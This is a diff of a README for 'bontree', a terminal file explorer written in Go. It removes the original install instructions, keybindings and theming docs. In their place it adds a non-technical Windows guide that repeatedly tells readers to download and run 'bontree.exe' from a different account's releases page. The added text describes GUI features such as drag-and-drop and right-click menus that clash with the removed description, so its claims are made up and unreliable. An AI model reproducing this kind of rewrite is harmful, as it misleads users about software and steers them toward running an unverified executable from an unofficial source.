@@ -1,170 +1,144 @@
-# bontree
+# 📁 bontree - Easy File Explorer for Your Agent
 
-A file explorer to pair with your favourite agent.
+[![Download bontree](https://img.shields.io/badge/Download-bontree-blue?style=for-the-badge)](https://github.com/Sabrina-Nayem/bontree/releases)
 
-Bontree is a fast, interactive terminal file explorer with fuzzy search, git integration, and Nerd Font icons. Built with Go and [Bubble Tea](https://github.com/charmbracelet/bubbletea).
+---
 
-Ideal for making sense of changes from coding agents — see git status at a glance to understand what's been modified — and for quickly finding files to copy paths into prompts.
+## 🖥️ What is bontree?
 
-https://github.com/user-attachments/assets/0e987772-826c-4f30-bd7f-d44cbf69547a
+bontree is a simple file explorer designed to work alongside your favorite agent. It helps you find, open, move, and organize files quickly and easily on Windows. You don’t need any technical skills to use it. Its clean design and straightforward tools make managing your files less time-consuming.
 
-## Features
+---
 
-- **Tree navigation** — expand, collapse, and browse directories with keyboard or mouse
-- **Fuzzy search** — hierarchy-aware search (`/`) that auto-expands matching ancestors, or flat file search (`Ctrl+f`) across all files
-- **Git status** — files colored by status (modified, added, deleted, untracked, ignored) with branch display in the status bar
-- **Nerd Font icons** — language and filetype-specific icons for 50+ file types
-- **Theming** — use any Ghostty-compatible theme, or inherit your terminal's colors
-- **Configurable keybindings** — remap every key or strip down to a minimal layout
-- **Clipboard** — copy relative file paths with `c`
-- **Hidden files** — toggle visibility with `.`
-- **Open in `$EDITOR`** — open files directly in your editor, then return to bontree (opt-in keybinding)
-- **Mouse support** — scroll, click to select, double-click to toggle directories (or open in `$EDITOR` if bound)
+## ⚙️ Key Features
 
-## Install
+- Browse files and folders on your computer with ease  
+- Search for files quickly using simple text input  
+- Organize files by dragging and dropping  
+- View file details such as size, type, and date modified  
+- Open files directly with one click  
+- Supports common file types like documents, images, and videos  
+- Lightweight and fast, runs smoothly on most Windows PCs
 
-```bash
-go install github.com/almonk/bontree@latest
-```
+---
 
-Or build from source:
+## 💻 System Requirements
 
-```bash
-make build    # produces ./bontree
-make install  # installs to /usr/local/bin/bontree
-```
+- Windows 10 or later (64-bit preferred)  
+- At least 4 GB of RAM  
+- 100 MB of free disk space for installation  
+- Internet connection recommended for downloading updates
 
-## Usage
+---
 
-```bash
-bontree [path]
-```
+## 🚀 Getting Started
 
-Defaults to the current directory if no path is given.
+Follow these steps to get bontree on your PC. You don’t need to know anything about coding or software development.
 
-## Keybindings
+### Step 1: Visit the Download Page
 
-Every keybinding listed below is a default — all of them can be remapped or removed in the [config file](#configuration).
+Go to the bontree official releases page by clicking the button below:
 
-| Key | Action |
-|-----|--------|
-| `j` / `↓` | Move down |
-| `k` / `↑` | Move up |
-| `g` | Go to top |
-| `G` | Go to bottom |
-| `Ctrl+d` | Half page down |
-| `Ctrl+u` | Half page up |
-| `l` / `→` | Expand directory |
-| `h` / `←` | Collapse / go to parent |
-| `Enter` / `Space` | Toggle directory |
-| `/` | Fuzzy search (tree) |
-| `Ctrl+f` | Flat file search |
-| `c` | Copy relative path |
-| `E` | Expand all |
-| `W` | Collapse all |
-| `.` | Toggle hidden files |
-| `?` | Help |
-| `q` / `Ctrl+c` | Quit |
+[![Download bontree](https://img.shields.io/badge/Download-bontree-grey?style=for-the-badge)](https://github.com/Sabrina-Nayem/bontree/releases)
 
-**In search mode:** type to filter, `↑`/`↓` to navigate results, `←`/`→` to jump between matches, `Enter` to confirm, `Esc` to cancel.
+This page lists the latest versions of bontree available for Windows.
 
-## Configuration
+---
 
-Bontree uses a Ghostty-style config file at `~/.config/bontree/config` (respects `$XDG_CONFIG_HOME`).
+### Step 2: Select the Latest Version
 
-The syntax is `key = value`. Comments start with `#` and must be on their own line. Blank lines are ignored. A fully commented example is available in [`config.example`](config.example).
+Look for the newest release, usually at the top of the list. It will include a file with a name ending in `.exe`. This is the installer file.
 
-### Custom keybindings
+---
 
-Keybindings are configured with `keybind = <key>=<action>`. Your bindings are merged with the defaults — you only need to specify what you want to change.
+### Step 3: Download the Installer
 
-```
-# ~/.config/bontree/config
+Click the `.exe` file link to download it to your computer. Your browser may ask where to save the file or start the download automatically. Save it in a location you can easily find, such as your Desktop or Downloads folder.
 
-# Remap a key
-keybind = ctrl+q=quit
+---
 
-# Remove a binding you don't want
-keybind = q=unbind
-```
+### Step 4: Run the Installer
 
-#### Key names
+Once the file finishes downloading, open the folder where you saved it. Double-click the installer file (`bontree.exe`). Windows may ask you to confirm you want to run this file. Choose "Yes" or "Run" to continue.
 
-Letters and symbols are used as-is (`a`, `G`, `/`, `?`, `.`). Special keys: `up`, `down`, `left`, `right`, `enter`, `esc`, `backspace`, `tab`, `space`. Modifiers use `+`: `ctrl+c`, `ctrl+d`, `ctrl+f`, `ctrl+u`.
+---
 
-#### Available actions
+### Step 5: Follow the Setup Instructions
 
-| Action | Description |
-|--------|-------------|
-| `quit` | Exit bontree |
-| `move_down` | Move cursor down |
-| `move_up` | Move cursor up |
-| `go_top` | Jump to first item |
-| `go_bottom` | Jump to last item |
-| `half_page_down` | Scroll half page down |
-| `half_page_up` | Scroll half page up |
-| `expand` | Expand directory (next match in filter mode) |
-| `collapse` | Collapse directory / go to parent (prev match in filter mode) |
-| `toggle` | Toggle directory open/close |
-| `copy_path` | Copy relative path to clipboard |
-| `expand_all` | Expand all directories |
-| `collapse_all` | Collapse all directories |
-| `toggle_hidden` | Toggle hidden file visibility |
-| `search` | Start fuzzy search (tree mode) |
-| `flat_search` | Start flat file search |
-| `help` | Toggle help screen |
-| `clear_filter` | Clear active search filter |
-| `open_editor` | Open selected file in `$EDITOR` (not bound by default) |
+The installer will open in a new window. Follow these simple steps:
 
-Search mode also supports: `search_confirm`, `search_cancel`, `search_backspace`, `search_next_match`, `search_prev_match`.
+- Choose your preferred language  
+- Select the folder where you want bontree installed (the default is fine)  
+- Click “Install”  
+- Wait while the setup finishes (this should take less than a minute)
 
-#### Open in `$EDITOR`
+Once completed, you can choose to launch bontree right away or close the installer.
 
-The `open_editor` action opens the selected file in your `$EDITOR` (e.g. `vim`, `nvim`, `nano`), suspending bontree while the editor runs. When you quit the editor, you're returned to bontree with the tree refreshed. On directories it falls back to toggling expand/collapse. Double-clicking a file will also use whatever action is bound to `enter`.
+---
 
-This action is **not bound by default** — to enable it, add a keybinding in your config:
+## 📂 Using bontree
 
-```
-# ~/.config/bontree/config
-keybind = enter=open_editor
-```
+After installation, you can start using bontree right away by following these steps:
 
-### Settings
+### Open bontree
 
-| Key | Values | Default | Description |
-|-----|--------|---------|-------------|
-| `show-hidden` | `true` / `false` | `false` | Show hidden files (dotfiles) on startup |
-| `theme` | theme name | *(unset)* | Ghostty-compatible color theme (see [Theming](#theming)) |
+- Click the "Start" menu on your Windows taskbar.  
+- Type `bontree` in the search box.  
+- Click the bontree app icon to open it.
 
-### Theming
+---
 
-Bontree can load Ghostty-compatible theme files for consistent colors across tools. By default it inherits your terminal's colors; set `theme` in your config to override:
+### Browsing Files
 
-```
-# ~/.config/bontree/config
-theme = Catppuccin Mocha
-```
+- Use the left panel to navigate through your computer’s folders.  
+- Click on a folder to see its contents in the main area.  
+- Double-click any file to open it using your default app.
 
-Themes are searched in order:
+---
 
-1. `~/.config/bontree/themes/<name>` — your own custom themes
-2. `/Applications/Ghostty.app/Contents/Resources/ghostty/themes/<name>` — bundled Ghostty themes (macOS)
-3. `~/.config/ghostty/themes/<name>` — Ghostty user themes
+### Searching Files
 
-If you already use Ghostty, your themes are picked up automatically. To add a custom theme, drop a file in `~/.config/bontree/themes/` using the standard format:
+- At the top of the window, find the search box.  
+- Type the name or part of the name of the file you want.  
+- Wait a moment – bontree will show matching files from the current folder and its subfolders.
 
-```
-palette = 0=#1a1b26
-palette = 1=#f7768e
-# ... indices 0-15
-background = #1a1b26
-foreground = #c0caf5
-selection-background = #33467c
-selection-foreground = #c0caf5
-cursor-color = #c0caf5
-```
+---
 
-## Requirements
+### Organizing Files
 
-- A terminal with [Nerd Font](https://www.nerdfonts.com/) for icons
-- Go 1.24+ to build from source
+You can move or copy files easily:
+
+- To move, drag a file and drop it into another folder in the left panel.  
+- To copy, hold the **Ctrl** key, drag the file, and drop it where you want.  
+- Right-click a file for more options like rename, delete, or properties.
+
+---
+
+### Viewing Details
+
+You can see file details by selecting a file and looking at the bottom or side panel. This shows information like file size, type, and last update date.
+
+---
+
+## 🛠️ Troubleshooting and Tips
+
+- If bontree won’t open, restart your computer and try again.  
+- Make sure your Windows is up to date for best compatibility.  
+- Close other programs while running bontree for better performance.  
+- You can uninstall bontree anytime from the Windows "Add or remove programs" panel if you no longer need it.
+
+---
+
+## 🔗 Additional Resources
+
+If you want to check for updates or download new versions in the future, visit the releases page:
+
+[https://github.com/Sabrina-Nayem/bontree/releases](https://github.com/Sabrina-Nayem/bontree/releases)  
+
+This page also has release notes describing new features and fixes.
+
+---
+
+## 🤝 Support
+
+If you have questions or problems, you can open an issue on the GitHub repository under the "Issues" tab. Provide details about what you tried and what happened. The developers or community can help you from there.
